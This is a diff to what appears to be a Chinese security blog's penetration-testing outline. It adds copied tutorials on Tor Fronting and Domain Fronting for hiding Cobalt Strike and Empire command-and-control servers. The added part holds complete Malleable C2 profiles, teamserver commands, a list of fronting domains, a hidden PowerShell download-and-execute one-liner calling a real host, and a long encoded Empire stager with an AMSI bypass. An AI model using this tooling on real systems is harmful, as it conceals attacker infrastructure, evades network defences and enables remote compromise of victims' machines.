@@ -221,7 +221,9 @@
 <blockquote>
 <p>我这里只是想借助OWASP测试指南的部分方式来构建一套自己使用的标准化的渗透测试流程，当然如果有直接的标准化的渗透测试流程的话欢迎留言告知。</p>
 </blockquote>
-<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><h2 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h2><h3 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h3><h3 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h3><h3 id="VPS-VPN-C-amp-C"><a href="#VPS-VPN-C-amp-C" class="headerlink" title="VPS/VPN/C&amp;C"></a>VPS/VPN/C&amp;C</h3><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><p>开放信息获取<br>Google Hacking<br>Email 采集<br>Whois 及域名注册信息<br>联系方式(手机号)<br>工商信息</p>
+<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><h2 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h2><h3 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h3><h3 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h3><h3 id="VPS-VPN-C-amp-C"><a href="#VPS-VPN-C-amp-C" class="headerlink" title="VPS/VPN/C&amp;C"></a>VPS/VPN/C&amp;C</h3><h3 id="踪迹隐藏"><a href="#踪迹隐藏" class="headerlink" title="踪迹隐藏"></a>踪迹隐藏</h3><p>学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting<br>同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。</p>
+<p>隐匿的攻击之-Domain Fronting<br><a href="http://www.4hou.com/technology/3516.html" target="_blank" rel="external">http://www.4hou.com/technology/3516.html</a><br>隐匿的攻击之-Tor Fronting<br><a href="https://evi1cg.me/archives/Domain_Fronting.html" target="_blank" rel="external">https://evi1cg.me/archives/Domain_Fronting.html</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><p>开放信息获取<br>Google Hacking<br>Email 采集<br>Whois 及域名注册信息<br>联系方式(手机号)<br>工商信息</p>
 <h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><p>DNS枚举<br>子域名爆破</p>
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>Nmap<br>在线Nmap <a href="http://www.soujujia.com/" target="_blank" rel="external">http://www.soujujia.com/</a></p>
 <h3 id="SMB枚举"><a href="#SMB枚举" class="headerlink" title="SMB枚举"></a>SMB枚举</h3><p>NetBIOS<br>SMB</p>
@@ -234,6 +236,151 @@
 <p>一种是采用site:chinatt.com这种方式，这种方式用来搜索所有包括该站点的一些信息。<br>一种是采用cache:chinatt.com这种方式，这种方式<br>也有一些其他技巧待补充，例如 inurl 关键字。</p>
 <h2 id="WEB应用指纹测试-OWASP-IG-004"><a href="#WEB应用指纹测试-OWASP-IG-004" class="headerlink" title="WEB应用指纹测试(OWASP-IG-004)"></a>WEB应用指纹测试(OWASP-IG-004)</h2><p>这一步的目的是用来看网络应用采用的是什么框架，使用的Web服务器版本等信息。</p>
 <p>有一个常见的web应用指纹探测工具 Wappalyzer<br>另外有些在线扫描器也提供web应用指纹探测服务。</p>
+<h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><h2 id="Tor-Fronting"><a href="#Tor-Fronting" class="headerlink" title="Tor Fronting"></a>Tor Fronting</h2><p>0x01 简介</p>
+<p>学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting ，同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。</p>
+<p>0x02 Tor Hidden Services</p>
+<p>Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。</p>
+<p>怎样搭建Tor Hidden Services可以参考此wiki，下面介绍一下我测试环境的搭建过程。<br>环境为：Ubuntu 12.04<br>搭建过程如下：<br>查看系统信息:</p>
+<p>lsb_release -a<br>1488523664840587.png</p>
+<p>可以看到Codename为precise，所以在这里选择deb类型如下：</p>
+<p>1488523712445346.png</p>
+<p>之后按照官方wiki修改更新源，我的源路径为/etc/apt/sources.list，有的系统更新源路径可能在/etc/apt/sources.list.d/，在源中添加以下条目：</p>
+<p>deb <a href="http://deb.torproject.org/torproject.org" target="_blank" rel="external">http://deb.torproject.org/torproject.org</a> precise main<br>deb-src <a href="http://deb.torproject.org/torproject.org" target="_blank" rel="external">http://deb.torproject.org/torproject.org</a> precise main<br>1488523753277661.png</p>
+<p>之后执行以下命令:</p>
+<p>gpg –keyserver keys.gnupg.net –recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89<br>gpg –export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add -<br>安装：</p>
+<p>$ sudo apt-get update<br>$ sudo apt-get install tor deb.torproject.org-keyring<br>执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。</p>
+<p>之后要对tor进行一下配置，编辑配置文件/etc/tor/torrc，将以下两个参数前的注释去掉。</p>
+<p>HiddenServiceDir /var/lib/tor/hidden_service/<br>HiddenServicePort 80 127.0.0.1:8080<br>HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。<br>配置完成以后对Tor服务进行重启：</p>
+<p>sudo service tor restart<br>查看获取到的hostname:</p>
+<p>sudo cat /var/lib/tor/hidden_service/hostname<br>1488523808853156.png</p>
+<p>其中xxxxx.onion则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。<br>开启8080端口的服务：</p>
+<p>☁  ~  cd /tmp<br>☁  ~  python -m SimpleHTTPServer 8080<br>Serving HTTP on 0.0.0.0 port 8080 …<br>使用tor浏览器访问此域名，可看到8080端口的响应：</p>
+<p>1488523856653801.png</p>
+<p>0x03 Tor2Web</p>
+<p>要对这个隐藏server进行利用，需要借助于一个代理，即tor2web，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如<a href="http://duskgytldkxiuqc6.onion/的链接时，直接修改.onion成.onion.to或.onion.city" target="_blank" rel="external">http://duskgytldkxiuqc6.onion/的链接时，直接修改.onion成.onion.to或.onion.city</a> 或 onion.cab 或者任何一个提供此服务的域名即可。如下图：</p>
+<p>1488523907610033.png</p>
+<p>当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图：</p>
+<p>1488523950633919.png</p>
+<p>那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：</p>
+<p>1488524056302821.png</p>
+<p>curl -b ‘onion_cab_iKnowShit=yourcookie’  ‘<a href="https://xxxx.onion.cab/1.txt" target="_blank" rel="external">https://xxxx.onion.cab/1.txt</a>‘<br>0x04 Cobalt Strike</p>
+<p>同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：<br>tor-fronting.profile</p>
+<h1 id="make-our-C2-look-like-a-Google-Web-Bug"><a href="#make-our-C2-look-like-a-Google-Web-Bug" class="headerlink" title="make our C2 look like a Google Web Bug"></a>make our C2 look like a Google Web Bug</h1><h1 id="https-developers-google-com-analytics-resources-articles-gaTrackingTroubleshooting"><a href="#https-developers-google-com-analytics-resources-articles-gaTrackingTroubleshooting" class="headerlink" title="https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting"></a><a href="https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting" target="_blank" rel="external">https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</a></h1><p>#</p>
+<h1 id="Author-armitagehacker"><a href="#Author-armitagehacker" class="headerlink" title="Author: @armitagehacker"></a>Author: @armitagehacker</h1><h1 id="Modified-by-Vincent-Yiu-vysecurity-for-TOR"><a href="#Modified-by-Vincent-Yiu-vysecurity-for-TOR" class="headerlink" title="Modified by Vincent Yiu @vysecurity for TOR."></a>Modified by Vincent Yiu @vysecurity for TOR.</h1><p>set sleeptime “5000”;<br>http-get {<br>        set uri “/_<strong>utm”;<br>        client {<br>                header “Host” “bjaw6h36vwruhwvb.onion.cab”;<br>                header “Cookie” “onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d”;<br>                metadata {<br>                        base64url;<br>                        prepend “\</strong>utma”;<br>                        parameter “utmcc”;<br>                }<br>        }<br>        server {<br>                header “Content-Type” “plain/text”;<br>                output {</p>
+<pre><code>                # hexdump pixel.gif
+                # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
+                # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
+                # 0000020 01 00 01 00 00 02 01 44 00 3b
+                prepend &quot;x01x00x01x00x00x02x01x44x00x3b&quot;;
+                prepend &quot;xffxffxffx21xf9x04x01x00x00x00x2cx00x00x00x00&quot;;
+                prepend &quot;x47x49x46x38x39x61x01x00x01x00x80x00x00x00x00&quot;;
+                print;
+        }
+}
+</code></pre><p>}<br>http-post {<br>        set uri “/__utm”;<br>        set verb “GET”;<br>        client {<br>                header “Host” “bjaw6h36vwruhwvb.onion.cab”;<br>                header “Cookie” “onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d”;<br>                id {<br>                        prepend “UA-220”;<br>                        append “-2”;<br>                        parameter “utmac”;<br>                }<br>                output {<br>                        base64url;<br>                        prepend “__utma”;<br>                        parameter “utmcc”;<br>                }<br>        }<br>        server {<br>                header “Content-Type” “plain/text”;<br>                output {<br>                        prepend “x01x00x01x00x00x02x01x44x00x3b”;<br>                        prepend “xffxffxffx21xf9x04x01x00x00x00x2cx00x00x00x00”;<br>                        prepend “x47x49x46x38x39x61x01x00x01x00x80x00x00x00x00”;<br>                        print;<br>                }<br>        }<br>}</p>
+<h1 id="dress-up-the-staging-process-too"><a href="#dress-up-the-staging-process-too" class="headerlink" title="dress up the staging process too"></a>dress up the staging process too</h1><p>http-stager {<br>        server {<br>                header “Content-Type” “plain/text”;<br>        }<br>}<br>在这里需要注意的是，我们需要修改Get以及Post中的Host及Cookie为自己的。当然，如果你想让数据包呈现别的样子，你也可以自己再写一个profile。</p>
+<p>开启teamserver：</p>
+<p>☁  cobal  sudo ./teamserver [your ip] hacktest tor-fronting.profile<br>1488524105436218.png</p>
+<p>连接到Teamserver，之后创建监听：</p>
+<p>333.png</p>
+<p>因为onion.cab使用的https，所以我们需要生成一个HTTPS Beacon，Host随意输入一个域名，端口一定要改成443。</p>
+<p>使用onion.cab:</p>
+<p>1488524182176629.png</p>
+<p>生成HTTPS Beacon：</p>
+<p>5.png</p>
+<p>生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。<br>选择Edit：</p>
+<p>1488524248686330.png</p>
+<p>修改参数如下：</p>
+<p> 555.png</p>
+<p>保存之后，运行HTTPS beacon，成功上线：</p>
+<p>1488524335412351.png</p>
+<p>操作视频</p>
+<p>0x05 小结</p>
+<p>使用Tor Fronting 有以下几个特点：</p>
+<p>1、你不需要外网环境，将C2放到Docker或者本地都可以！（但是需要服务器在墙外）<br>2、使C2匿名；<br>3、并不需要在目标机上安装Tor；<br>4、默认是安全的。<br>5、要求C2上同时安装Cobalt Strike及Tor服务。<br>通过流量转发来隐藏自己的真正服务器是隐藏的关键，而如何寻找转发和怎么样使用它是很有趣的过程，希望文章能给你有所启发。</p>
+<p>0x06 参考</p>
+<p>1、<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" target="_blank" rel="external">https://www.torproject.org/docs/tor-hidden-service.html.en</a><br>2、<a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/" target="_blank" rel="external">https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/</a><br>3、<a href="https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html" target="_blank" rel="external">https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html</a><br>4、<a href="https://www.tor2web.org/" target="_blank" rel="external">https://www.tor2web.org/</a></p>
+<h2 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h2><p>0x01 简介</p>
+<p>最近看到了一些关于Domain Fronting的技术，感觉很有意思，其特点在于，你真正访问的域名并不是你看到的域名，即可以隐藏攻击者的真实地址，并且此技术能够让我们在一些受限制的网络中依然连接到我们的C2服务器，其关键思想是在不同的通信层使用不同的域名，在HTTP(S)请求中，目标域名通常显示在三个关键位置：DNS查询，TLS（SNI）拓展及HTTP主机头中，通常，这三个地方都会是我们要访问的域名地址，然而，在”Domain Fronting”请求中，DNS查询以及SNI携带了一个域名（前域），而在HTTP host头中携带了另一个域名（隐蔽的，被禁止访问的域名），简单的图例如下:</p>
+<p>1487928970021.png</p>
+<p>通常检查器不能阻止DNS及SNI中请求的内容，而HOST头对检查器不可见，但对接收HTTP(S)请求的前端服务器可见，而前端服务器，在内部请求HTTP头中的Host的地址，进而达到隐蔽目的地的目的。关于Domain Fronting 这里有一篇文章有详细的介绍《Blocking-resistant communication through domain fronting》。本文就不在详细介绍了。感觉这个技术很有趣，所以就对此技术进行了一下研究与学习，并写此文进行分享。</p>
+<p>0x02 情形</p>
+<p>渗透测试过程中，我们会遇到这种情形，即网络中部署了很多防御方案，比如防火墙开启IDP，IPS，IDS等，这些方案可用于限制网络出站规则，例如，仅仅允许TCP 80及443通过代理离开网络，并且还会有许多设备在应用层来检查这个流量，如果检测到恶意的Payload，则进行拦截并报警。绕过这些解决方案一直是入侵者与防御者之间的博弈，防御者努力的想怎么拦，而入侵者在努力的想怎么绕。因此也有了很多很多的攻击技术，比如DNS隧道，ICMP隧道等等。最近有一篇文章《Doodles, stickers, and censorship circumvention for Signal Android》介绍了通过Domain Fronting来绕过信号限制的方式，在此文中指出“许多流行的服务和CDN（如Google，Amazon Cloudfront，Amazon S3，Azure，CloudFlare，Fastly和Akamai）可以以一种方式获取信号，这种方式看起来与其他未经审查的流量不可辨别。因此，我们也可以通过此技术来绕过一些过滤规则。</p>
+<p>0x03 示例</p>
+<p>这里我们使用Amazon’s CloudFront作为一个演示，CloudFront是一种内容交付网络服务。它为用户提供了一个全局分布式缓存，用于托管在其服务器上的文件。这减少了客户服务器上的负载，并允许CDN提供来自与请求者数据中心的缓存内容，当客户端连接到CloudFront的时候，其根据HOST头来判断客户端想要请求的域名，首先在Amazon’s CloudFront注册账号，之后按以下步骤建立自己的CloudFront：<br>一、选择服务，CloudFront</p>
+<p>1487935200773.png</p>
+<p>二、新建节点</p>
+<p>1487936788551.png</p>
+<p>三、配置节点<br>1487937150167.png</p>
+<p>填入自己的域名，并把Origin Protocol Policy配置为Match Viewer</p>
+<p>1487937381866.png</p>
+<p>修改箭头几处值</p>
+<p>其他默认，点击创建。成功如下图：</p>
+<p>1487937492210.png</p>
+<p>evi1cg.me为指向测试C2服务器的域名，下面使用wget来进行测试。</p>
+<p>wget -U demo -q -O - <a href="http://evi1cg.me/foo.txt" target="_blank" rel="external">http://evi1cg.me/foo.txt</a><br>hello  there !<br>d289wv3b5uz3me.cloudfront.net为我的CloudFront，对这个域名的访问可访问到evi1cg.me的IP。</p>
+<p>wget -U demo -q -O - <a href="http://d289wv3b5uz3me.cloudfront.net/foo.txt" target="_blank" rel="external">http://d289wv3b5uz3me.cloudfront.net/foo.txt</a><br>hello  there !<br>如下图：</p>
+<p>1487937890235.png</p>
+<p>现在我们来伪造主机头来试试看。这里使用a0.awsstatic.com，此域名来自于这里。<br>直接访问不会范围任何东西：</p>
+<p>wget -U demo -q -O - <a href="http://a0.awsstatic.com/foo.txt" target="_blank" rel="external">http://a0.awsstatic.com/foo.txt</a><br>修改Host头，伪造Host为我们创建的CloudFront所分发的FQDN，这样就返回了我们要访问的文件：</p>
+<p>wget -U demo -q -O - <a href="http://a0.awsstatic.com/foo.txt" target="_blank" rel="external">http://a0.awsstatic.com/foo.txt</a> –header “Host: d289wv3b5uz3me.cloudfront.net”<br>如下图：</p>
+<p>1487938242961.png</p>
+<p>这样我们就可以使用高信誉域名来代替我们自己的域名了。</p>
+<p>那么如何寻找类似于a0.awsstatic.com这样的高信誉域名呢，这里可以使用这个简单的命令来寻找：</p>
+<p>for i in {a..z}; do for j in {0..9}; do wget -U demo -q -O - <a href="http://$i$j.awsstatic.com/foo.txt" target="_blank" rel="external">http://$i$j.awsstatic.com/foo.txt</a> –header “Host: d289wv3b5uz3me.cloudfront.net” &amp;&amp; echo $i$j; done;done<br>如下图：</p>
+<p>1487939278917.png</p>
+<p>当然这里还可以写一个脚本来从热门网站列表中寻找可以使用的CDN子域，关于这个可以参考这个文章Domain Fronting Via Cloudfront Alternate Domains。</p>
+<p>下面分享几个可用的域名：</p>
+<p>cdn.az.gov，cdn.zendesk.com，cdn.atlassian.com，a1.awsstatic.com，f0.awsstatic.com</p>
+<p>0x04 应用</p>
+<p>1.Cobalt Strike</p>
+<p>大家都知道，Cobalt Strike可以通过Malleable C2 profile来修改becon的传输方式，那么在这里，我们也可以通过这个来进行重定向。所以要修改的就是在文件中修改header的Host指向我们的节点。比如：</p>
+<p>http-get {<br>    client {<br>        header “Host” “[your distribution].cloudfront.net”;<br>http-post {<br>    client {<br>        header “Host” “[your distribution].cloudfront.net”;<br>这里要注意的是http-get与http-post都要修改。<br>一个修改好的webbug.profile如下：</p>
+<h1 id="make-our-C2-look-like-a-Google-Web-Bug-1"><a href="#make-our-C2-look-like-a-Google-Web-Bug-1" class="headerlink" title="make our C2 look like a Google Web Bug"></a>make our C2 look like a Google Web Bug</h1><h1 id="https-developers-google-com-analytics-resources-articles-gaTrackingTroubleshooting-1"><a href="#https-developers-google-com-analytics-resources-articles-gaTrackingTroubleshooting-1" class="headerlink" title="https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting"></a><a href="https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting" target="_blank" rel="external">https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</a></h1><p>#</p>
+<h1 id="Author-armitagehacker-1"><a href="#Author-armitagehacker-1" class="headerlink" title="Author: @armitagehacker"></a>Author: @armitagehacker</h1><p>http-get {<br>    set uri “/__utm.gif”;<br>    client {<br>        parameter “utmac” “UA-2202604-2”;<br>        parameter “utmcn” “1”;<br>        parameter “utmcs” “ISO-8859-1”;<br>        parameter “utmsr” “1280x1024”;<br>        parameter “utmsc” “32-bit”;<br>        parameter “utmul” “en-US”;<br>        header “Host” “d289wv3b5uz3me.cloudfront.net”;<br>        metadata {<br>            netbios;<br>            prepend “__utma”;<br>            parameter “utmcc”;<br>        }<br>    }<br>    server {<br>        header “Content-Type” “image/gif”;<br>        output {</p>
+<pre><code>        # hexdump pixel.gif
+        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
+        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
+        # 0000020 01 00 01 00 00 02 01 44 00 3b
+        prepend &quot;\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b&quot;;
+        prepend &quot;\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00&quot;;
+        prepend &quot;\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00&quot;;
+        print;
+    }
+}
+</code></pre><p>}<br>http-post {<br>    set uri “/___utm.gif”;<br>    client {<br>        header “Content-Type” “application/octet-stream”;<br>        id {<br>            prepend “UA-220”;<br>            append “-2”;<br>            parameter “utmac”;<br>        }<br>        parameter “utmcn” “1”;<br>        parameter “utmcs” “ISO-8859-1”;<br>        parameter “utmsr” “1280x1024”;<br>        parameter “utmsc” “32-bit”;<br>        parameter “utmul” “en-US”;<br>        header “Host” “d289wv3b5uz3me.cloudfront.net”;<br>        output {<br>            print;<br>        }<br>    }<br>    server {<br>        header “Content-Type” “image/gif”;<br>        output {<br>            prepend “\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b”;<br>            prepend “\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00”;<br>            prepend “\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00”;<br>            print;<br>        }<br>    }<br>}</p>
+<h1 id="dress-up-the-staging-process-too-1"><a href="#dress-up-the-staging-process-too-1" class="headerlink" title="dress up the staging process too"></a>dress up the staging process too</h1><p>http-stager {<br>    server {<br>        header “Content-Type” “image/gif”;<br>    }<br>}<br>使用c2lint 来测试：</p>
+<p>./c2lint Malleable-C2-Profiles/normal/webbug.profile<br>1488004981887.png</p>
+<p>可以看到host已经改成了我们的节点地址。<br>之后启动teamserver:</p>
+<p>☁  cobal  sudo ./teamserver [your ip] hacktest webbug.profile<br>1488006856445.png</p>
+<p>之后连接到teamserver。<br>创建监听：</p>
+<p>1488012794921.png</p>
+<p>注意host填的地址。并且要注意端口一定要是80。之后再填入我们找的那些高信誉域名地址，比如cdn.az.gov,当然可以填入多个，以,隔开即可：</p>
+<p>1488013056103.png</p>
+<p>使用web Delivery进行测试：</p>
+<p>1488012868208.png</p>
+<p>生成Posershell命令如下：</p>
+<p>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://d289wv3b5uz3me.cloudfront.net:80/a" target="_blank" rel="external">http://d289wv3b5uz3me.cloudfront.net:80/a</a>‘))”<br>客户端运行以后成功上线：</p>
+<p>1488013203593.png</p>
+<p>使用wireshark查看流量：</p>
+<p>2.gif</p>
+<p>可以看到流量里面并没有我们的真实域名而只有我们的节点地址，而解析的DNS地址是高信誉域名的地址。</p>
+<p>如果想使用HTTPS，可以参考使用HTTPS beacon，及这个视频。本文就不做介绍了。</p>
+<p>2.Empire</p>
+<p>使用Empire2.0(之所以使用2.0，是因为2.0可以自定义http头信息，只需要使用”|” 隔开即可)，需要对Listener进行重新配置。具体设置如下：</p>
+<p>(Empire: listeners) &gt; uselistener http<br>(Empire: listeners/http) &gt;<br>(Empire: listeners/http) &gt; set Host <a href="http://cdn.az.gov:80" target="_blank" rel="external">http://cdn.az.gov:80</a><br>(Empire: listeners/http) &gt; set DefaultProfile /admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (WindowsNT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko | Host:d289wv3b5uz3me.cloudfront.net<br>(Empire: listeners/http) &gt; execute<br>[*] Starting listener ‘http’<br>[+] Listener successfully started!<br>特别注意DefaultProfile后面添加了Host，并且使用端口为80！</p>
+<p>配置后结果如下：</p>
+<p>1488020089367.png</p>
+<p>之后开启监听，并配置stager</p>
+<p>(Empire: listeners) &gt; usestager multi/launcher<br>(Empire: stager/multi/launcher) &gt; set Listener http<br>(Empire: stager/multi/launcher) &gt; generate<br>powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBSAEUAZgBdAC4AQQBTAFMARQBNAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAVABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQATgBVAGwATAAsACQAVAByAFUARQApAH0AOwBbAFMAeQBTAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAYwBlAFAATwBpAE4AVABNAGEAbgBhAEcAZQByAF0AOgA6AEUAWABwAGUAQwB0ADEAMAAwAEMAbwBOAHQASQBOAFUAZQA9ADAAOwAkAHcAQwA9AE4ARQBXAC0ATwBCAEoARQBDAHQAIABTAHkAUwBUAEUATQAuAE4AZQBUAC4AVwBFAEIAQwBMAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwBOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgARQBBAEQARQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBvAHgAWQA9AFsAUwBZAHMAVABFAG0ALgBOAGUAdAAuAFcARQBiAFIARQBxAFUAZQBTAFQAXQA6ADoARABlAEYAYQB1AEwAdABXAEUAQgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBvAHgAeQAuAEMAUgBlAEQARQBOAHQAaQBhAEwAcwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBlAFQALgBDAHIAZQBEAGUAbgBUAEkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcATwByAGsAQwByAGUAZABlAG4AVABJAGEAbABTADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQBYAFQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AHQARQBzACgAJwBlADEAMABhAGQAYwAzADkANAA5AGIAYQA1ADkAYQBiAGIAZQA1ADYAZQAwADUANwBmADIAMABmADgAOAAzAGUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAGQAKAAiAEgAbwBzAHQAIgAsACIAZAAyADgAOQB3AHYAMwBiADUAdQB6ADMAbQBlAC4AYwBsAG8AdQBkAGYAcgBvAG4AdAAuAG4AZQB0ACIAKQA7ACQAVwBjAC4ASABFAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgBTAHoAKwB5AEQAUABVAFEAcgBwAGwAVQBNAGQAbABKAEIAKwBVAEoAZwBEAHAAagB1AHcAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvAGMAZABuAC4AYQB6AC4AZwBvAHYAOgA4ADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AYQBzAHAAJwA7ACQAZABBAHQAYQA9ACQAVwBDAC4ARABPAFcATgBsAG8AYQBEAEQAYQB0AEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQARABBAHQAQQBbADQALgAuACQARABBAFQAYQAuAEwARQBuAGcAdABIAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA<br>执行过程如下：</p>
+<p>1.gif</p>
+<p>其DNS查询结果为：</p>
+<p>1488020545677.png</p>
+<p>开启的网络连接为：<br>1488020641953.png</p>
+<p>0x05 小结</p>
+<p>使用此技巧可以有效地隐藏自己的真实地址，并且可以在一定程度上绕过某些防护，在渗透测试中应该是一个很不错的技术，希望此文对你有所帮助。</p>
+<p>0x06 参考</p>
+<p>1、<a href="https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks" target="_blank" rel="external">https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks</a><br>2、<a href="https://www.bamsoftware.com/papers/fronting/" target="_blank" rel="external">https://www.bamsoftware.com/papers/fronting/</a><br>3、<a href="https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/" target="_blank" rel="external">https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/</a><br>4、<a href="https://www.xorrior.com/Empire-Domain-Fronting/" target="_blank" rel="external">https://www.xorrior.com/Empire-Domain-Fronting/</a></p>
 
       
     </div>
@@ -348,7 +495,7 @@
         <div class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">261</span>
